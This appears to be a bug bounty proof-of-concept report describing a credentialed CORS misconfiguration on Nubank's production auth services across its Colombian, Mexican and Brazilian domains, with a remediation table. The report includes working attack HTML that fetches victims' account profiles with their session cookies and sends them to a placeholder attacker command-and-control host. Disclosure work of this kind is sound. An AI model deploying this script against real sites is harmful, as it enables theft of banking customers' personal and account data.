⚠ Nubank CORS Credentialed Cross-Origin Exfiltration PoC

Researcher Context: This PoC is for Bugcrowd submission against Nubank's bug bounty program. No data is sent to external servers. All requests use X-Correlation-Id: bc-handle to identify as a researcher probe. Testing is passive — no data is modified.

Vulnerability Summary

All Nubank production microservices reflect any subdomain of *.nu.com.co, *.nu.com.mx, or *.nubank.com.br in the Access-Control-Allow-Origin header, combined with Access-Control-Allow-Credentials: true.

Attack Prerequisite: Attacker controls a page at any *.nu.com.co subdomain (via subdomain takeover, XSS on any Nubank page, open redirect, or DNS takeover of a retired subdomain).

Impact: When a logged-in Nubank victim visits the attacker's page, their session cookies are sent cross-origin. The server accepts the request (CORS allows it) and returns the victim's sensitive account data.

Attack HTML (Hosted at https://takeover.nu.com.co/)

<!-- Attacker's page at https://[subdomain-takeover].nu.com.co/steal.html -->
<script>
// 1. Exfiltrate Colombia user profile
fetch('https://prod-global-auth.nu.com.co/api/me', {
  credentials: 'include',
  headers: { 'X-Correlation-Id': 'bc-handle' }
})
.then(r => r.json())
.then(data => {
  // 2. Send victim data to attacker C2
  navigator.sendBeacon(
    'https://attacker-c2.example.com/collect',
    JSON.stringify({ source: 'nu.com.co', user: data })
  );
});

// 3. Also exfiltrate Brazil user profile (cross-TLD!)
//    Works because nubank.com.br auth also reflects *.nu.com.co origins
fetch('https://prod-global-auth.nubank.com.br/api/me', {
  credentials: 'include',
  headers: { 'X-Correlation-Id': 'bc-handle' }
})
.then(r => r.json())
.then(data => {
  navigator.sendBeacon(
    'https://attacker-c2.example.com/collect',
    JSON.stringify({ source: 'nubank.com.br', user: data })
  );
});
</script>

Remediation

FixDetail
Restrict CORS origin allowlistReplace dynamic origin reflection with an explicit static allowlist: only nu.com.co, nu.com.mx, nubank.com.br (no subdomains)
Remove wildcard subdomain reflectionNubank does not own attacker-registerable subdomains, but DNS takeovers of retired subdomains are realistic; reflecting all *.nu.com.co subdomains with credentials is unsafe
Scope session cookiesSet Nubank session cookies to Domain=nu.com.co (not .nu.com.co) to prevent cookies from being sent to subdomains
Cross-TLD isolationnubank.com.br auth should not reflect nu.com.co origins and vice versa — TLDs serve different markets and should be isolated
